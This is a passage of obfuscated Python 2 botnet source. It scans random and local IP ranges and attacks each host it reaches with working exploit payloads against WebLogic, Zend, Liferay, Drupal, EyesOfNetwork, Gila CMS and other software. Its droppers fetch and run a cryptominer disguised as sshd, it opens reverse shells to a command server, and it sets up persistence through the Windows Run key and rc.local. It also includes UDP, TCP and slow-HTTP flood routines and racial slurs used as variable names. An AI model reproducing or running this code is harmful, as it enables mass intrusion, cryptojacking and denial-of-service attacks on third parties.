        if "443" in str(srvport):
            url = "https://"+ip+":"+str(srvport)
        else:
            url = "http://"+ip+":"+str(srvport)
        myuseragent = random.choice(self.GbASkEbE)
        encodedfaggot = 'php%20-r%20%22file_put_contents%28%5C%22.setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F' + mydomain + '%2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2F' + mydomain + '%2Fsetup%20-O%3Bcurl%20http%3A%2F%2F' + mydomain + '%2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22.setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F' + mydomain + '%2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2F' + mydomain + '%2Fsetup%20-O%20.setup%3Bwget%20http%3A%2F%2F' + mydomain + '%2Fsetup.py%20-O%20.setup.py%3Bchmod%20777%20.setup.py%3Bchmod%20777%20.setup%3Bpython2%20.setup.py%7C%7Cpython2.7%20.setup.py%7C%7Cpython%20.setup.py%7C%7C.%2F.setup.py%7C%7C.%2F.setup'
        stupidnigeria = 'cd /tmp||cd $(find / -writable -readable -executable | head -n 1);php -r "file_put_contents(\\".setup\\", file_get_contents(\\"http://DOMAIN/setup\\"));";curl http://DOMAIN/setup -O;wget http://DOMAIN/setup -O .setup;chmod 777 .setup;./.setup;php -r "file_put_contents(\\".setup.py\\", file_get_contents(\\"http://DOMAIN/setup.py\\"));";curl http://DOMAIN/setup.py -O;wget http://DOMAIN/setup.py -O .setup.py;chmod 777 .setup.py;./.setup||python2 .setup.py||python .setup.py||./setup.py;DIR=`pwd`;ARGS="-o DOMAIN:9050";LINE="[ ! -f $DIR/.pidfile ] && echo > $DIR/.pidfile;$DIR/.1/sshd $ARGS||$DIR/.2/sshd $ARGS >> /dev/null||./sshd $ARGS >> /dev/null &";cd $DIR;echo "$LINE" > $DIR/.backup.sh;curl http://DOMAIN/xmrig1 -O||wget http://DOMAIN/xmrig1 -O xmrig1;mkdir $DIR/.1;mv -f xmrig1 $DIR/.1/sshd;chmod 777 $DIR/.1/sshd;curl http://DOMAIN/xmrig -O||wget http://DOMAIN/xmrig -O xmrig;mkdir $DIR/.2;mv -f xmrig $DIR/.2/sshd;chmod 777 $DIR/.2/sshd;chmod +x $DIR/.backup.sh;$DIR/.backup.sh'.replace("DOMAIN", mydomain)
        winbox = "@powershell -NoProfile -ExecutionPolicy unrestricted -Command \"(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/py.exe', 'python.exe'); (New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/setup.py', 'setup.py');\" & .\python.exe setup.py".replace("DOMAIN", mydomain)
        try:
            if "quicklinksrowout" in urllib2.urlopen(urllib2.Request(url+'/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi")', "", headers={'User-Agent' : myuseragent,  'Content-Type':'text/xml'}), context=self.ctx).read():
                try:
                    urllib2.urlopen(urllib2.Request(url+"/console/css/%252e%252e%252fconsole.portal", zlib.decompress("\x78\x9c\x8d\x53\xef\x6b\xdb\x30\x10\xfd\x57\x34\x7f\x68\x25\xd8\x14\xb6\x8f\x0b\x66\x84\x76\x23\x85\x8e\x96\x66\xd0\x0f\xeb\x28\xb2\x7c\x89\x95\xca\x92\xab\x1f\x71\x4a\xe9\xff\xde\x93\xed\x34\x71\x19\x5b\xbe\xc8\x3a\xf1\xee\xdd\xbd\x77\xe7\x7b\xb3\x6c\x8a\x3c\xb8\x08\x27\xf7\x8d\x58\xc1\xa5\x28\x40\xe7\x73\x5b\xc3\x35\x46\x9f\x4f\x2a\x61\x4a\x0d\xb9\xb4\x35\x0f\xc2\xac\xac\xb7\x9a\x4b\x5b\x81\x03\x23\x81\xd7\x1b\xd0\x5f\xb8\xaf\xf8\xa2\x02\xad\x17\xe0\xbd\xb2\x86\x9e\xb6\x50\x68\xbb\x52\x92\xb7\xd6\x3d\xf0\xef\x5b\x90\x31\xc0\xaf\xca\x81\x28\x09\x8c\xa2\x9c\xd0\x7f\x80\x19\xe9\xbf\x5c\x46\x87\x05\x43\x1f\x51\x36\x1d\xe7\xdc\xe2\x31\x2b\x45\x13\xc0\x11\x31\x7c\xf3\x71\x21\xbe\x82\x70\xd6\x93\x24\x34\x52\xac\xc5\x46\x70\x8d\x92\xb8\x83\xa5\x06\x19\xf8\x0f\x05\xba\x24\xcb\xee\xcc\x77\x44\x5d\xa2\x16\xde\x53\x96\xae\xe7\x20\xb5\x70\x50\x76\x58\x9a\x49\x6b\x0c\xa6\xa2\xe8\x79\xe7\x93\xcb\xd8\xb4\x23\xe0\x1e\xc2\x4c\xca\x64\x48\xa1\x81\x26\x7f\xd9\xf4\xaa\x58\x23\x98\xd8\x62\x8d\xfc\x3d\x0c\x29\xe9\x50\xe9\x40\x95\x07\xb7\xd1\x10\xb8\x32\xf8\x6e\x84\xe6\x8b\xfe\xe1\x06\x1e\x23\xf8\x70\x51\x37\x9a\x38\x78\x1c\xb9\x77\x44\x0e\x4b\xa5\xdf\x09\xfa\x09\xa1\xb2\xa8\x04\xaf\xe3\x84\x8c\x21\xd5\xc6\x3e\x00\xc5\x24\x36\x5d\x04\xa7\xcc\x8a\xc8\x3a\x79\x83\xb5\x53\xee\x1c\x8d\x05\x87\x2e\xd4\x65\xb6\x43\xfc\xfe\x93\x30\x1e\x41\x8b\x27\x1f\xa0\x4e\xb8\x6b\x67\x1b\x70\xe1\x89\x66\xd6\x73\x23\x6a\x40\xee\x60\x2f\x6d\x0b\xee\x4c\x78\xc0\x46\xd0\xc7\x20\x94\xf1\x34\x6b\x95\x29\x6d\x9b\x31\xf2\x8d\x18\x68\xc9\x8e\xf4\x39\x15\xe1\x38\xd2\xec\x23\xc9\x26\x12\x4f\x8c\x5f\xc8\xd7\x77\xa0\x49\xa1\xcc\xc4\x57\x09\xf4\x69\x07\x9a\xaa\x25\xa1\xa9\xef\x0f\x39\x31\x51\xa3\x0b\xcf\x83\x18\x07\x3e\xea\x80\xad\x26\x92\x6e\x1f\x62\x50\x68\x9c\x14\x38\x55\x47\xf7\x1b\x72\x13\x4d\x50\x35\x24\x2d\xc3\x15\x7b\x4e\xfb\x95\x78\x7d\xe7\xe3\x85\x69\x62\x40\x5e\x10\x35\x65\x8c\x47\x0f\xe7\xa0\x55\xad\x42\x32\xe8\xee\x6e\x86\x92\x0d\x6c\x03\x3d\x6a\xca\xbe\xb1\xc6\xc3\x30\x66\x7f\xe4\x98\xf7\x49\x6c\x37\xa0\xbf\xcf\x79\x07\xdd\x4f\x18\xe1\x6c\x8a\x95\xf8\x7e\x0b\xae\x62\x38\x10\xc4\x5b\x87\x4a\x86\x28\xb9\xf5\xd6\xcf\xb6\xd6\x83\x6b\x9d\xa7\x87\x36\xf4\xf6\xb2\xff\x30\x2f\x75\xf4\x15\x7d\x03\xdd\xba\xce\xb2\xa1\x22\xcd\x70\xb1\x5e\xc6\x7f\x72\xa7\xdc\xc5\x26\x79\x79\xca\x5e\x01\x81\x62\xb7\xf8"), {'User-Agent': myuseragent, "Content-Type": "application/x-www-form-urlencoded", 'cmd': stupidnigeria}), context=self.ctx)
                except:
                    pass
                try:
                    urllib2.urlopen(urllib2.Request(url+"/console/css/%252e%252e%252fconsole.portal", zlib.decompress("\x78\x9c\x8d\x53\xef\x6b\xdb\x30\x10\xfd\x57\x34\x7f\x68\x25\xd8\x14\xb6\x8f\x0b\x66\x84\x76\x23\x85\x8e\x96\x66\xd0\x0f\xeb\x28\xb2\x7c\x89\x95\xca\x92\xab\x1f\x71\x4a\xe9\xff\xde\x93\xed\x34\x71\x19\x5b\xbe\xc8\x3a\xf1\xee\xdd\xbd\x77\xe7\x7b\xb3\x6c\x8a\x3c\xb8\x08\x27\xf7\x8d\x58\xc1\xa5\x28\x40\xe7\x73\x5b\xc3\x35\x46\x9f\x4f\x2a\x61\x4a\x0d\xb9\xb4\x35\x0f\xc2\xac\xac\xb7\x9a\x4b\x5b\x81\x03\x23\x81\xd7\x1b\xd0\x5f\xb8\xaf\xf8\xa2\x02\xad\x17\xe0\xbd\xb2\x86\x9e\xb6\x50\x68\xbb\x52\x92\xb7\xd6\x3d\xf0\xef\x5b\x90\x31\xc0\xaf\xca\x81\x28\x09\x8c\xa2\x9c\xd0\x7f\x80\x19\xe9\xbf\x5c\x46\x87\x05\x43\x1f\x51\x36\x1d\xe7\xdc\xe2\x31\x2b\x45\x13\xc0\x11\x31\x7c\xf3\x71\x21\xbe\x82\x70\xd6\x93\x24\x34\x52\xac\xc5\x46\x70\x8d\x92\xb8\x83\xa5\x06\x19\xf8\x0f\x05\xba\x24\xcb\xee\xcc\x77\x44\x5d\xa2\x16\xde\x53\x96\xae\xe7\x20\xb5\x70\x50\x76\x58\x9a\x49\x6b\x0c\xa6\xa2\xe8\x79\xe7\x93\xcb\xd8\xb4\x23\xe0\x1e\xc2\x4c\xca\x64\x48\xa1\x81\x26\x7f\xd9\xf4\xaa\x58\x23\x98\xd8\x62\x8d\xfc\x3d\x0c\x29\xe9\x50\xe9\x40\x95\x07\xb7\xd1\x10\xb8\x32\xf8\x6e\x84\xe6\x8b\xfe\xe1\x06\x1e\x23\xf8\x70\x51\x37\x9a\x38\x78\x1c\xb9\x77\x44\x0e\x4b\xa5\xdf\x09\xfa\x09\xa1\xb2\xa8\x04\xaf\xe3\x84\x8c\x21\xd5\xc6\x3e\x00\xc5\x24\x36\x5d\x04\xa7\xcc\x8a\xc8\x3a\x79\x83\xb5\x53\xee\x1c\x8d\x05\x87\x2e\xd4\x65\xb6\x43\xfc\xfe\x93\x30\x1e\x41\x8b\x27\x1f\xa0\x4e\xb8\x6b\x67\x1b\x70\xe1\x89\x66\xd6\x73\x23\x6a\x40\xee\x60\x2f\x6d\x0b\xee\x4c\x78\xc0\x46\xd0\xc7\x20\x94\xf1\x34\x6b\x95\x29\x6d\x9b\x31\xf2\x8d\x18\x68\xc9\x8e\xf4\x39\x15\xe1\x38\xd2\xec\x23\xc9\x26\x12\x4f\x8c\x5f\xc8\xd7\x77\xa0\x49\xa1\xcc\xc4\x57\x09\xf4\x69\x07\x9a\xaa\x25\xa1\xa9\xef\x0f\x39\x31\x51\xa3\x0b\xcf\x83\x18\x07\x3e\xea\x80\xad\x26\x92\x6e\x1f\x62\x50\x68\x9c\x14\x38\x55\x47\xf7\x1b\x72\x13\x4d\x50\x35\x24\x2d\xc3\x15\x7b\x4e\xfb\x95\x78\x7d\xe7\xe3\x85\x69\x62\x40\x5e\x10\x35\x65\x8c\x47\x0f\xe7\xa0\x55\xad\x42\x32\xe8\xee\x6e\x86\x92\x0d\x6c\x03\x3d\x6a\xca\xbe\xb1\xc6\xc3\x30\x66\x7f\xe4\x98\xf7\x49\x6c\x37\xa0\xbf\xcf\x79\x07\xdd\x4f\x18\xe1\x6c\x8a\x95\xf8\x7e\x0b\xae\x62\x38\x10\xc4\x5b\x87\x4a\x86\x28\xb9\xf5\xd6\xcf\xb6\xd6\x83\x6b\x9d\xa7\x87\x36\xf4\xf6\xb2\xff\x30\x2f\x75\xf4\x15\x7d\x03\xdd\xba\xce\xb2\xa1\x22\xcd\x70\xb1\x5e\xc6\x7f\x72\xa7\xdc\xc5\x26\x79\x79\xca\x5e\x01\x81\x62\xb7\xf8"), {'User-Agent': myuseragent, "Content-Type": "application/x-www-form-urlencoded", 'cmd': winbox}), context=self.ctx)
                except:
                    pass
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url+'/include/makecvs.php?Event=%60' + encodedfaggot + '%60', headers={'User-Agent' : myuseragent}), context=self.ctx)
        except:
            pass
        try:
            zsploit = {
                'hello' : b64encode('O:25:"Zend\\Http\\Response\\Stream":2:{s:10:"\0*\0cleanup";b:1;s:13:"\0*\0streamName";O:25:"Zend\\View\\Helper\\Gravatar":2:{s:7:"\0*\0view";O:30:"Zend\\View\\Renderer\\PhpRenderer":1:{s:41:"\0Zend\\View\\Renderer\\PhpRenderer\0__helpers";O:31:"Zend\\Config\\ReaderPluginManager":2:{s:11:"\0*\0services";a:2:{s:10:"escapehtml";O:23:"Zend\\Validator\\Callback":1:{s:10:"\0*\0options";a:2:{s:8:"callback";s:6:"system";s:15:"callbackOptions";a:1:{i:0;s:959:"' + self.stringproc(stupidnigeria) + '";}}}s:14:"escapehtmlattr";r:7;}s:13:"\0*\0instanceOf";s:23:"Zend\\Validator\\Callback";}}s:13:"\0*\0attributes";a:1:{i:1;s:1:"a";}}}')
            }
            urllib2.urlopen(urllib2.Request(url+"/zend3/public/", urllib.urlencode(zsploit), headers={'Content-Type': 'application/json', 'User-Agent' : myuseragent}), context=self.ctx)
        except:
            pass
        try:
            liferay = {
                'columnId': '1',
                'name': '2',
                'type': '3',
                '+defaultData': 'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource',
                'defaultData.userOverridesAsString': 'HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707874000a446576654f626a65637474001c687474703a2f2f' + mycncip.encode('hex') + '3a383030342f740003466f6f;'
            }
            urllib2.urlopen(urllib2.Request(url+"/api/jsonws/expandocolumn/update-column", data=urllib.urlencode(liferay), headers={'Content-Type': 'application/json', 'Authorization' : 'Basic dGVzdEBsaWZlcmF5LmNvbTp0ZXN0','User-Agent' : myuseragent}), context=self.ctx)
        except:
            pass
        phprevb64 = b64encode("$sock=fsockopen('" + mycncip + "',9999);$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);")
        try:
            drupal = {
                'form_id' : 'user_pass',
                '_triggering_element_name' : 'name'
            }
            urllib2.urlopen(urllib2.Request(url + '/?q=user/password&name%5b%23post_render%5d%5b%5d=assert&name%5b%23markup%5d=eval%28base64_decode%28%29%22' + phprevb64 +'%22%29%3b&name%5b%23type%5d=markup', data=urllib.urlencode(drupal), headers={'User-Agent' : myuseragent}), context=self.ctx)
        except:
            pass
        randgetvar=randomstring(8)
        try:
            eyesofnetwork = {
                "page" : "bylistbox",
                "host_list" : "127.0.0.1",
                "tool_list" : "/proc/self/environ",
                "snmp_com" : "aze",
                "snmp_version" : "2c",
                "min_port" : "1",
                "max_port" : "1024",
                "username" : "",
                "password" : "",
                "snmp_auth_protocol" : "MD5",
                "snmp_priv_passphrase" : "",
                "snmp_priv_protocol" : "",
                "snmp_context" : ""
            }
            urllib2.urlopen(urllib2.Request(url + '/module/tool_all/select_tool.php&'+randgetvar+"="+phprevb64, data=urllib.urlencode(eyesofnetwork), headers={'User-Agent' : '<?php eval(base64_decode($_GET[' + randgetvar + '])); ?>'}), context=self.ctx)
        except:
            pass
        try:
            randuser=randomstring(random.randint(4,8))
            urllib2.urlopen(urllib2.Request(url+"/auth/requestreset&"+randgetvar+"="+phprevb64, data="{" + '"' + "auth" + '"' + ":{" + '"' + "user" + '"' + ": " + '"' + "" + randuser + "'.eval(base64_decode($_GET[" + randgetvar +"])).'" + '"' + "}}",headers={'Content-Type': 'application/json; charset=UTF-8', 'User-Agent' :  myuseragent, "Orgin": url}), context=self.ctx)
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url+"/gila/?c=admin", headers={"User-Agent": '<?php eval(base64_decode("' + phprevb64 + '")); include "src\\core\\bootstrap.php"; ?>', "Cookie": "GSESSIONID=../../index.php"}), context=self.ctx)
            urllib2.urlopen(urllib2.Request(url+"/gila/index.php", headers={'User-Agent' :  myuseragent}), context=self.ctx)
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url+"/actions/authenticate.php", data=urllib.urlencode({"user": 'test' + '"' + '&bash -i >& /dev/tcp/' + mycncip + '/9999 0>&1', "pswd": "test"}), headers={'Content-Type': 'application/json', 'User-Agent' :  myuseragent}), context=self.ctx)
        except:
            pass
        try:
            self.scanips.remove(address)
        except:
            pass
    def gen_IP(self):
        not_valid = [10,127,169,172,192,233,234]
        fioasadihco = random.randrange(1,256)
        while fioasadihco in not_valid:
            fioasadihco = random.randrange(1,256)
        ip = ".".join([str(fioasadihco),str(random.randrange(1,256)),
        str(random.randrange(1,256)),str(random.randrange(1,256))])
        return ip
    def worker(self):
        while True:
            while self.scannerenabled==0:
                time.sleep(1)
            address = self.gen_IP()
            self.scanips.append(address)
            for theport in portlist:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((address, theport))
                    s.close()
                    self.exploit(address, theport)
                except:
                    pass
    def dajsJgBT(self):
        if os.name == 'nt':
            try:
                aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
                aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
                SetValueEx(aKey,"System explore",0, REG_SZ, os.getenv("USERPROFILE") + "\\$6829.exe " + os.path.r)
                windll.kernel32.SetFileAttributesW(os.getenv("USERPROFILE") + "\\$6829.exe", FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
            return
        else:
            try:
                resolv=open("/etc/resolv.conf", "w")
                resolv.write("nameserver 1.1.1.1\nnameserver 1.0.0.1\n")
                resolv.close()
                rc=open("/etc/rc.local","rb")
                data=rc.read()
                rc.close()
                if "boot" not in data:
                    with open(myfullpath, 'rb') as source, open("/etc/boot", 'wb') as destin:
                        while True:
                            copybuff = source.read(1024*1024)
                            if not copybuff:
                                break
                            destin.write(copybuff)
                    os.chmod("/etc/boot", 777)
                    rc=open("/etc/rc.local","wb")
                    if "exit" in data:
                        rc.write(data.replace("exit", "/etc/boot\nexit"))
                    else:
                        rc.write("\n/etc/boot")    
                    rc.close()
            except:
                pass
    def YQYZpxFe(self,OHCdSBTA,EoVtvYCA,XusYRFMu):   
        if str(EoVtvYCA).startswith("0"):
            YqlwXkhL=os.urandom(random.randint(1024,65507))
        else:
            YqlwXkhL="\xff"*65507
        IWNKrdcU=time.time()+XusYRFMu
        self.gLsaWmlh=0
        while IWNKrdcU>time.time():
            if self.AELmEnMe == 1:
                break
            try:
                OxYXMYUq=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if EoVtvYCA==0:
                    OxYXMYUq.sendto(YqlwXkhL,(OHCdSBTA, random.randrange(1,65535)))
                else:
                    OxYXMYUq.sendto(YqlwXkhL,(OHCdSBTA, EoVtvYCA))
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def oBwjfHGs(self,EBcZqJni,EoVtvYCA,XusYRFMu):
        IWNKrdcU=time.time()+XusYRFMu
        while IWNKrdcU>time.time():
            if self.AELmEnMe == 1:
                return
            try:
                OxYXMYUq=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                OxYXMYUq.settimeout(0.001)
                OxYXMYUq.connect((EBcZqJni, EoVtvYCA))
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def oBTwCjfHGPs(self,EBcZqJni,EoVtvYCA,XusYRFMu):
        IWNKrdcU=time.time()+XusYRFMu
        while IWNKrdcU>time.time():
            if self.AELmEnMe == 1:
                return
            try:
                OxYXMYUq=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                OxYXMYUq.connect((EBcZqJni, EoVtvYCA))
                OxYXMYUq.send(os.urandom(ramom.randint(1024, 65535)))
                OxYXMYUq.close()
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def UDilxaOf(self,gSRaQsAT, ekAcxzEz, sockets, XusYRFMu):
        IWNKrdcU=time.time()+XusYRFMu
        self.gLsaWmlh = 0
        fds = []
        for QBQtdKIm in xrange(0, int(sockets)):
            fds.append(0)
        while 1:
            if self.AELmEnMe == 1:
                break
            for QBQtdKIm in xrange(0, int(sockets)):
                if self.AELmEnMe == 1:
                    break
                fds[QBQtdKIm] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    fds[QBQtdKIm].connect((gSRaQsAT, int(ekAcxzEz)))
                except:
                    pass
            PGRzbfUd = "GET / HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n" % (gSRaQsAT, ekAcxzEz, random.choice(self.GbASkEbE))
            for nHrRZUKk in PGRzbfUd:
                if self.AELmEnMe == 1:
                    break
                for fd in fds:
                    try:
                        fd.send(nHrRZUKk)
                        self.gLsaWmlh+=1
                    except:
                        try:
                            fd.connect((gSRaQsAT, int(ekAcxzEz)))
                        except:
                            pass
                if IWNKrdcU<time.time():
                    for fd in fds:
                        try:
                            fd.close()
                        except:
                            pass
                    return
                time.sleep(1)
                self.gLsaWmlh = 0
        self.gLsaWmlh=0
    def sMTJQLQX(self,bZtHOlSl):
        try:
            req = urllib2.Request(bZtHOlSl)
            req.add_header('User-Agent', random.choice(self.GbASkEbE))
            return urllib2.urlopen(req).read()
        except:
            return ""
    def sMTJQLQXTor(self,bZtHOlSl):
        global proxylist
        try:
            myproxy = random.choice(proxylist)
            ss=socks.socksocket()
            ss.setproxy(socks.PROXY_TYPE_SOCKS5, myproxy.split(":")[0], int(myproxy.split(":")[1]), True)
            ss.connect((bZtHOlSl.split("//")[-1].split("/")[0].split('?')[0], 80))
            ss.send("GET " + "/"+"/".join(bZtHOlSl.split("://")[1].split("/")[1:]) + " HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n")
            x=recvTimeout(ss, 1024*1024, 1)
            ss.close()
            x="\r\n\r\n".join(x.split("\r\n\r\n")[1:])
            x="\n\n".join(x.split("\n\n")[1:])
            return x
        except:
            return ""
    def IVewnlka(self,url,recursive,XusYRFMu):
        if recursive=="true" or recursive == 1:
            IWNKrdcU=time.time()+XusYRFMu
            AkNEnSD=obfuscate(zlib.decompress('\x78\x9c\xab\xe1\x70\xf0\xd3\xcf\xe5\x95\xd6\x75\x4d\xb0\xf2\x94\x95\x2a\x74\x35\x01\x00\x29\x49\x04\x4d'))
            while IWNKrdcU>time.time():
                if self.AELmEnMe == 1:
                    break
                for TDibPNtf in re.findall('href'+AkNEnSD,self.sMTJQLQX(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.sMTJQLQX(TDibPNtf)
                for TDibPNtf in re.findall('src'+AkNEnSD,self.sMTJQLQX(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.sMTJQLQX(TDibPNtf)
        else:
            IWNKrdcU=time.time()+XusYRFMu
            while IWNKrdcU>time.time():
                if self.AELmEnMe == 1:
                    break
                self.sMTJQLQX(url)
    def IVewnlkaTor(self,url,recursive,XusYRFMu):
        if recursive=="true" or recursive == 1:
            IWNKrdcU=time.time()+XusYRFMu
            AkNEnSD=obfuscate(zlib.decompress('\x78\x9c\xab\xe1\x70\xf0\xd3\xcf\xe5\x95\xd6\x75\x4d\xb0\xf2\x94\x95\x2a\x74\x35\x01\x00\x29\x49\x04\x4d'))
            while IWNKrdcU>time.time():
                if self.AELmEnMe == 1:
                    break
                for TDibPNtf in re.findall('href'+AkNEnSD,self.sMTJQLQXTor(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.sMTJQLQXTor(TDibPNtf)
                for TDibPNtf in re.findall('src'+AkNEnSD,self.sMTJQLQXTor(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.sMTJQLQXTor(TDibPNtf)
        else:
            IWNKrdcU=time.time()+XusYRFMu
            while IWNKrdcU>time.time():
                if self.AELmEnMe == 1:
                    break
                self.sMTJQLQXTor(url)
    def checkIPport(self,awRLHHhl,theport,CrdOwtNy,WZvOEFyC):
        self.VSoeKsdv += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((awRLHHhl, theport))
            s.close()
            self.exploitstats[WZvOEFyC][1] += 1
            if CrdOwtNy == "true" or CrdOwtNy == "yes" or CrdOwtNy == "1":
                self.exploit(awRLHHhl,theport)
        except:
            pass
        self.VSoeKsdv -= 1
    def scanIP(self,awRLHHhl,EoVtvYCA,CrdOwtNy,WZvOEFyC):
        global portlist
        foundopen = 0
        self.VSoeKsdv += 1
        try:
            if EoVtvYCA == "allports":
                for theport in portlist:
                    threading.Thread(target=self.checkIPport, args=(awRLHHhl,theport,CrdOwtNy,WZvOEFyC,)).start()
            else:
                self.checkIPport(awRLHHhl,EoVtvYCA,CrdOwtNy)
        except:
            pass
        if foundopen == 1:
            self.exploitstats[WZvOEFyC][1] += 1
        self.exploitstats[WZvOEFyC][0] += 1
        self.VSoeKsdv -= 1
    def getMyCurrentIP(self):
        myip="Unknown"
        try:
            myip=urllib2.urlopen("https://api.ipify.org/").read()
        except:
            try:
                myip=urllib2.urlopen("http://ipinfo.io/ip").read()
            except:
                try:
                    myip=urllib2.urlopen("https://www.trackip.net/ip").read()
                except:
                    try:
                        myip=urllib2.urlopen("http://ifconfig.me/").read()
                    except:
                        try:
                            myip=urllib2.urlopen("http://icanhazip.com/").read().replace("\n","")
                        except:
                            pass
        return myip
    def CUhKIvCh(self,WZvOEFyC,EoVtvYCA,CrdOwtNy):
        try:
            if WZvOEFyC == "nearme":
                mypublicip=self.getMyCurrentIP()
                if mypublicip!=None:
                    WZvOEFyC=mypublicip+"/16"
            elif WZvOEFyC == "lan":
                WZvOEFyC=mylanip+"/16"
        except:
            self.commSock.send("PRIVMSG %s :Failed to grab IP\n" % (self.channelname))
            return
        (addrString, cidrString) = WZvOEFyC.split('/')
        ipaddr = addrString.split('.')
        cidrR = int(cidrString)
        netmask = [0, 0, 0, 0]
        for i in range(cidrR):
            netmask[i/8] = netmask[i/8] + (1 << (7 - i % 8))
        netip = []
        for i in range(4):
            netip.append(int(ipaddr[i]) & netmask[i])
        broad = list(netip)
        brange = 32 - cidrR
        for i in range(brange):
            broad[3 - i/8] = broad[3 - i/8] + (1 << (i % 8))
        net_mask = ".".join(map(str, netmask))
        from_ip = ".".join(map(str, netip))
        to_ip = ".".join(map(str, broad))
        startipaddr = struct.unpack('>I', socket.inet_aton(".".join(map(str, netip))))[0]
        endipaddr = struct.unpack('>I', socket.inet_aton(".".join(map(str, broad))))[0]
        CrdOwtNy = CrdOwtNy.lower()
        if CrdOwtNy == "true" or CrdOwtNy == "yes" or CrdOwtNy == "1":
            if EoVtvYCA == "allports":
                self.commSock.send("PRIVMSG %s :Exploit scanning %s on port %s\n" % (self.channelname,"%s - %s" % (from_ip, to_ip),str(portlist)))
            else:
                self.commSock.send("PRIVMSG %s :Exploit scanning %s on port %s\n" % (self.channelname,"%s - %s" % (from_ip, to_ip),EoVtvYCA))
        else:
            self.commSock.send("PRIVMSG %s :Scanning %s on port %s\n" % (self.channelname,"%s - %s" % (from_ip, to_ip),EoVtvYCA))
        self.exploitstats[WZvOEFyC] = [0,0]
        for i in range(startipaddr, endipaddr):
            AjeVKe = socket.inet_ntoa(struct.pack('>I', i))
            try:
                if self.AELmEnMe == 1 or self.scannerenabled == 0:
                    return
                while self.VSoeKsdv >= (multiprocessing.cpu_count() * 10):
                    time.sleep(0.1)
                threading.Thread(target=self.scanIP, args=(AjeVKe,EoVtvYCA,CrdOwtNy,WZvOEFyC,)).start()
            except:
                pass
        self.commSock.send("PRIVMSG %s :Finished scanning range %s\n" % (self.channelname,WZvOEFyC))
    def ATTAKMYBRUDDA(self, attkproto, targ_et, timee, threads):
        self.domains = [['\x10','amazon.com'],['\x10','live.com'],['\x10','office.com'],['\x10','discord.com'],['\x10','wikihow.com'],['\x10','redbubble.com'],['\x10','coupang.com'],['\x10','politico.com'],['\x10','ria.ru'],['\x10','gds.it'],['\x10','teespring.com'],['\x10','quizizz.com'],['\x10','audible.com'],['\x10','bb.com.br'],['\x10','xbox.com'],['\x10','jpmorganchase.com'],['\x10','sagepub.com'],['\x10','clarin.com'],['\x10','kickstarter.com'],['\x10','study.com'],['\x10','greythr.com'],['\x10','telekom.com'],['\x10','smartrecruiters.com'],['\xff','gazeta.ru'],['\xff','valuecommerce.ne.jp'],['\x10','sii.cl'],['\x10','rt.ru'],['\xff','inoreader.com'],['\xff','freepik.es'],['\x10','yemek.com'],['\x10','hapitas.jp'],['\x10','xoom.com'],['\xff','belwue.de'],['\xff','fanfiction.net'],['\x10','tasteofhome.com'],['\x10','skyroom.online'],['\x10','duosecurity.com'],['\x10','difi.no'],['\x10','indodax.com'],['\x10','williams-sonoma.com'],['\xff','kamihq.com'],['\x10','lamoda.ru'],['\x10','mononews.gr'],['\x10','tineye.com'],['\x10','santander.com.mx'],['\xff','theclutcher.com'],['\x10','emailanalyst.com'],['\x10','coincheck.com'],['\x10','tuya.com'],['\x10','atlantico.eu'],['\x10','unicef.org'],['\x10','bizpacreview.com'],['\xff','torontomls.net'],['\x10','nobroker.in'],['\x10','paytmmall.com'],['\x10','jornaldeangola.ao'],['\x10','timesjobs.com'],['\x10','watcha.com'],['\x